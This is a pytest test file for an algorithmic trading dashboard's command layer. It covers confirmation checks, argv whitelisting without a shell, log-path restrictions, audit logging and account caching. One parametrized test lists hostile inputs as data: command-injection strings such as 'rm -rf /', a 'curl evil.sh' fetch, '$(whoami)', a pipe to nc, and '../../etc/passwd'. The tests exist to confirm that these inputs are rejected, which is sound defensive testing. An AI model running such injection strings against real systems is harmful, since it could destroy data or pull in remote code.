"""The dashboard's command layer — the only place a click can become an order.

Two things must hold no matter what the browser sends:
  1. Anything that moves money needs a typed confirmation, checked HERE (server-side), not
     in the page. A stray fetch must not be able to place a trade.
  2. Arguments are whitelisted and passed as an argv list. No shell, ever.
"""
import pytest

from algo import webui


@pytest.fixture(autouse=True)
def _never_really_run(monkeypatch):
    """Capture argv instead of executing. No test may touch the broker."""
    calls = []

    class Done:
        returncode = 0
        stdout = "ok"
        stderr = ""

    def fake_run(argv, **kw):
        assert isinstance(argv, list), "argv must be a list — a string would invoke a shell"
        assert kw.get("shell") is not True
        calls.append(argv)
        return Done()

    monkeypatch.setattr(webui.subprocess, "run", fake_run)
    webui._calls = calls
    yield calls


# ---------- confirmation ----------

@pytest.mark.parametrize("cmd", ["enter", "add", "exit", "protect", "arm"])
def test_money_commands_refuse_without_confirmation(cmd, _never_really_run):
    r = webui.run_command(cmd, {"symbol": "HCLTECH", "qty": 10, "sl_pct": 1.0}, confirm=None)
    assert r["ok"] is False and "Confirmation failed" in r["output"]
    assert _never_really_run == [], "nothing may be executed without confirmation"


def test_wrong_confirmation_is_refused(_never_really_run):
    r = webui.run_command("exit", {"symbol": "HCLTECH"}, confirm="INFY")
    assert r["ok"] is False
    assert _never_really_run == []


def test_correct_confirmation_is_accepted(_never_really_run):
    r = webui.run_command("exit", {"symbol": "HCLTECH"}, confirm="hcltech")  # case-insensitive
    assert r["ok"] is True
    assert _never_really_run[0][1:] == ["-m", "algo", "exit", "HCLTECH", "--yes"]


def test_squareoff_needs_the_literal_word(_never_really_run):
    assert webui.run_command("squareoff", {}, confirm="yes")["ok"] is False
    assert _never_really_run == []
    assert webui.run_command("squareoff", {}, confirm="SQUAREOFF")["ok"] is True


def test_read_only_commands_need_no_confirmation(_never_really_run):
    assert webui.run_command("status", {}, None)["ok"] is True
    assert webui.run_command("positions", {}, None)["ok"] is True


# ---------- input validation ----------

@pytest.mark.parametrize("bad", [
    "HCL; rm -rf /", "HCL && curl evil.sh", "HCL$(whoami)", "../../etc/passwd",
    "HCL`id`", "HCL|nc", "A" * 40, "",
])
def test_malicious_symbols_are_rejected(bad, _never_really_run):
    r = webui.run_command("exit", {"symbol": bad}, confirm=bad)
    assert r["ok"] is False
    assert _never_really_run == []


def test_bad_side_is_rejected(_never_really_run):
    r = webui.run_command("enter", {"symbol": "X", "side": "sideways", "qty": 1,
                                    "sl_pct": 1.0}, confirm="X")
    assert r["ok"] is False and "invalid input" in r["output"]
    assert _never_really_run == []


def test_unknown_command_is_rejected(_never_really_run):
    assert webui.run_command("rm", {}, None)["ok"] is False
    assert webui.run_command("__import__", {}, None)["ok"] is False
    assert _never_really_run == []


def test_non_numeric_qty_is_rejected(_never_really_run):
    r = webui.run_command("add", {"symbol": "X", "qty": "10; ls"}, confirm="X")
    assert r["ok"] is False
    assert _never_really_run == []


# ---------- argv construction ----------

def test_enter_builds_the_expected_argv(_never_really_run):
    webui.run_command("enter", {"symbol": "reliance", "side": "long", "qty": 590,
                                "sl_pct": 0.91, "pdh": 1320.8, "pdl": 1298.1},
                      confirm="RELIANCE")
    argv = _never_really_run[0]
    assert argv[1:] == ["-m", "algo", "enter", "RELIANCE", "--side", "long",
                        "--qty", "590", "--sl-pct", "0.91",
                        "--pdh", "1320.8", "--pdl", "1298.1", "--yes"]


def test_arm_auto_flag_only_appears_when_true(_never_really_run):
    webui.run_command("arm", {"symbol": "X", "side": "short", "below": 100.0,
                              "qty": 5, "sl_pct": 1.0, "auto": False}, confirm="X")
    assert "--auto" not in _never_really_run[0]
    webui.run_command("arm", {"symbol": "X", "side": "short", "below": 100.0,
                              "qty": 5, "sl_pct": 1.0, "auto": True}, confirm="X")
    assert "--auto" in _never_really_run[1]


def test_empty_optional_flags_are_dropped(_never_really_run):
    webui.run_command("protect", {"symbol": "X", "sl_pct": "", "trigger": None}, confirm="X")
    argv = _never_really_run[0]
    assert "--sl-pct" not in argv and "--trigger" not in argv


def test_quote_accepts_several_symbols(_never_really_run):
    webui.run_command("quote", {"symbols": "hcltech infy"}, None)
    assert _never_really_run[0][1:] == ["-m", "algo", "quote", "HCLTECH", "INFY"]


def test_skill_modes_are_prompts_not_commands():
    """Skill modes must never map into COMMANDS — they go to Claude, not the shell."""
    assert set(webui.SKILL_MODES).isdisjoint(set(webui.COMMANDS) - {"start", "exit"})
    for text in webui.SKILL_MODES.values():
        assert text.startswith("Run /intraday-trader ")


# ---------- raw log pane ----------

def test_log_sources_are_whitelisted_no_traversal():
    for bad in ["../../etc/passwd", "/etc/passwd", "algo.log/../../../etc/passwd", ""]:
        assert webui.read_log(bad)["ok"] is False


def test_read_log_tails_and_reports_total(tmp_path, monkeypatch):
    from algo import config
    monkeypatch.setattr(config, "LOGS_DIR", tmp_path)
    (tmp_path / "algo.log").write_text("\n".join(f"line{i}" for i in range(500)))
    r = webui.read_log("algo.log", lines=10)
    assert r["ok"] and r["lines"] == 500
    assert r["text"].splitlines()[-1] == "line499"
    assert len(r["text"].splitlines()) == 10


def test_read_log_missing_file_is_not_an_error(tmp_path, monkeypatch):
    from algo import config
    monkeypatch.setattr(config, "LOGS_DIR", tmp_path)
    r = webui.read_log("api.jsonl")
    assert r["ok"] is True and "does not exist" in r["text"]


def test_read_log_caps_requested_lines(tmp_path, monkeypatch):
    from algo import config
    monkeypatch.setattr(config, "LOGS_DIR", tmp_path)
    (tmp_path / "algo.log").write_text("x\n" * 20)
    assert webui.read_log("algo.log", lines=10**9)["ok"] is True
    assert webui.read_log("algo.log", lines=0)["ok"] is True


def test_page_carries_the_version_placeholder():
    """The server substitutes this per request; without it stale-page detection dies."""
    assert "__UI_VERSION__" in webui.PAGE
    assert 'const BUILT="__UI_VERSION__"' in webui.PAGE


# ---------- audit trail ----------

def test_every_command_is_logged_with_one_trace(tmp_path, monkeypatch, _never_really_run):
    """A dashboard click must leave a request record and a result record, same trace."""
    from algo import audit, config
    monkeypatch.setattr(config, "LOGS_DIR", tmp_path)
    r = webui.run_command("status", {}, None)
    rows = [__import__("json").loads(l)
            for l in (tmp_path / "actions.jsonl").read_text().splitlines()]
    kinds = [x["kind"] for x in rows]
    assert "command.requested" in kinds and "command.finished" in kinds
    traces = {x["trace"] for x in rows}
    assert len(traces) == 1 and r["trace"] in traces


def test_refused_command_is_still_auditable(tmp_path, monkeypatch, _never_really_run):
    """A refusal is exactly what you need in the log when debugging 'nothing happened'."""
    from algo import config
    monkeypatch.setattr(config, "LOGS_DIR", tmp_path)
    webui.run_command("exit", {"symbol": "HCLTECH"}, confirm="WRONG")
    # refused before spawning, so nothing ran — and nothing may be claimed to have run
    assert _never_really_run == []
    path = tmp_path / "actions.jsonl"
    if path.exists():
        rows = [__import__("json").loads(l) for l in path.read_text().splitlines()]
        assert "command.finished" not in [x["kind"] for x in rows]


def test_trace_propagates_to_the_child_process(_never_really_run, monkeypatch):
    """The subprocess must inherit ALGO_TRACE_ID or the trail breaks at the boundary."""
    from algo import audit
    seen = {}

    def capture(argv, **kw):
        seen.update(kw.get("env") or {})

        class D:
            returncode = 0
            stdout = "ok"
            stderr = ""
        return D()

    monkeypatch.setattr(webui.subprocess, "run", capture)
    r = webui.run_command("status", {}, None)
    assert seen.get(audit.TRACE_ENV) == r["trace"]
    assert seen.get(audit.SOURCE_ENV) == "web"


def test_polling_endpoints_are_not_request_logged():
    """Without this filter web.jsonl grows ~1,700 lines an hour and hides real requests."""
    for p in ("/api/state", "/api/logs?src=algo.log"):
        assert p.startswith(webui.Handler.POLLING)
    for p in ("/api/run", "/api/ask", "/"):
        assert not p.startswith(webui.Handler.POLLING)


# ---------- account panel ----------

def _reset_account_cache():
    webui._account_cache.update(ts=0.0, data=None)
    webui._profile_cache = None


def test_account_reports_client_id_and_funds(monkeypatch):
    _reset_account_cache()

    class FakeKite:
        def profile(self):
            return {"user_id": "PKR985", "user_name": "Test User",
                    "broker": "ZERODHA", "exchanges": ["NSE"], "products": ["MIS"]}

        def margins(self):
            return {"equity": {"net": 395207.2,
                               "available": {"live_balance": 316282.7, "cash": 0,
                                             "opening_balance": 395207.2},
                               "utilised": {"debits": 78924.5, "m2m_unrealised": -1690.9,
                                            "m2m_realised": 0}}}

    monkeypatch.setattr("algo.auth.get_kite", lambda: FakeKite())
    a = webui.account_snapshot(force=True)
    assert a["ok"] and a["client_id"] == "PKR985"
    assert a["available"] == 316282.7 and a["used"] == 78924.5
    assert a["m2m_unrealised"] == -1690.9


def test_account_prefers_live_balance_over_zero_cash(monkeypatch):
    """Kite reports cash=0 with the real figure in live_balance — a known trap."""
    _reset_account_cache()

    class FakeKite:
        def profile(self):
            return {"user_id": "X"}

        def margins(self):
            return {"equity": {"net": 500.0,
                               "available": {"cash": 0, "live_balance": 400.0},
                               "utilised": {}}}

    monkeypatch.setattr("algo.auth.get_kite", lambda: FakeKite())
    assert webui.account_snapshot(force=True)["available"] == 400.0


def test_dead_token_is_a_display_state_not_a_crash(monkeypatch):
    """A dead Kite token must never take the dashboard down."""
    _reset_account_cache()
    monkeypatch.setattr("algo.auth.get_kite",
                        lambda: (_ for _ in ()).throw(RuntimeError("token expired")))
    a = webui.account_snapshot(force=True)
    assert a["ok"] is False and "token expired" in a["error"]


def test_account_is_cached_so_polling_does_not_hammer_kite(monkeypatch):
    _reset_account_cache()
    calls = {"n": 0}

    class FakeKite:
        def profile(self):
            return {"user_id": "X"}

        def margins(self):
            calls["n"] += 1
            return {"equity": {}}

    monkeypatch.setattr("algo.auth.get_kite", lambda: FakeKite())
    for _ in range(10):
        webui.account_snapshot()
    assert calls["n"] == 1, "the 3s poll must not become 10 Kite calls"
